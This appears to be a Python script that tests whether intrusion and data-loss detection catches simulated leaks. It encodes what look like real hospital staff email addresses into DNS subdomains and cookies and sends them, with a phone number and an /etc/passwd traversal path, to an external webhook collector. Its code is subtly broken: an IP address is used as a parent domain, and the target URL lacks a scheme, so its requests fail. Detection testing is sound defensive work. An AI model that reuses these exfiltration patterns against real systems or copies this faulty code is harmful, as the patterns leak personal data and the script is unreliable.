import requests
import socket
import base64
import uuid

# --- CONFIGURATION ---
# Replace with the IP of the machine running the listener
LISTENER_IP = "192.168.1.31"
TARGET_URL = f"746de558-7321-45be-a848-2e6d82090fdf.dnshook.site"
DNS_DOMAIN = "8.8.8.8"

# Terminal Colors
R, G, Y, B, C = "\033[31m", "\033[32m", "\033[33m", "\033[34m", "\033[0m"

def test_dns(domain, label):
    print(f"{B}[DNS TEST] {label}:{C} {domain}")
    try:
        socket.gethostbyname(domain)
        print(f"    {G}└── Status: RESOLVED (Passed IDS/DLP){C}")
    except socket.gaierror as e:
        if e.errno == -5:
            print(f"    {Y}└── Status: SENT (Unresolved, but likely reached Webhook.site){e}{C}")
        else:
            print(f"    {R}└── Status: ERROR/BLOCKED: {e}{C}")

def test_http(method, label, path="/", headers=None, data=None, cookies=None):
    url = f"{TARGET_URL}{path}"
    print(f"{B}[HTTP TEST] {label}:{C} {method} {url}")
    try:
        if method == "GET":
            resp = requests.get(url, headers=headers, cookies=cookies, timeout=2)
        else:
            resp = requests.post(url, headers=headers, data=data, cookies=cookies, timeout=2)
        print(f"    {G}└── Status: {resp.status_code} (Passed IDS){C}")
    except Exception as e:
        print(f"    {R}└── Status: CONNECTION ERROR: {e}{C}")

# --- 1. DNS TESTS ---
print(f"\n{Y}=== DNS EXFILTRATION TESTS ==={C}")

unique_sub = uuid.uuid4().hex[:8]
test_dns(f"{unique_sub}.{DNS_DOMAIN}", "Unique Request")

# Valid request without subdomain
test_dns(f"{DNS_DOMAIN}", "Valid (No Subdomain)")

# Valid request with subdomain
test_dns(f"test.{DNS_DOMAIN}", "Valid (Standard Subdomain)")

# Malicious: Base64 leak
b64_leak = base64.b64encode(b"vguillot@hopitalmande.fr").decode().replace("=", "")
test_dns(f"{b64_leak}.{DNS_DOMAIN}", "MALICIOUS (Base64 Leak)")

# --- 2. HTTP TESTS ---
print(f"\n{Y}=== HTTP IDS DETECTION TESTS ==={C}")

# VALID REQUESTS
test_http("GET", "Valid GET", path="/index.html")
test_http("GET", "Valid Cookie", cookies={"session_id": "12345"})
test_http("GET", "Valid User-Agent", headers={"User-Agent": "Mozilla/5.0"})
test_http("POST", "Valid POST", data={"search": "test_query"})

# MALICIOUS REQUESTS
# 1. Malicious GET (Directory Traversal attempt)
test_http("GET", "MALICIOUS GET", path="/../../etc/passwd")

# 2. Malicious Cookie (Base64 Encoded Sensitive Info)
leak_mail = base64.b64encode(b"mcoulon@hopitalmande.fr").decode()
test_http("GET", "MALICIOUS Cookie", cookies={"user_data": leak_mail})

# 3. Malicious User-Agent (Scanner Detection)
test_http("GET", "MALICIOUS User-Agent", headers={"User-Agent": "sqlmap/1.8.0"})

# 4. Malicious POST (Sensitive Data: Phone/Credit Card)
test_http("POST", "MALICIOUS POST", data={"phone": "+33 6 72 58 01 31"})

print(f"\n{B}[*] All tests dispatched.{C}")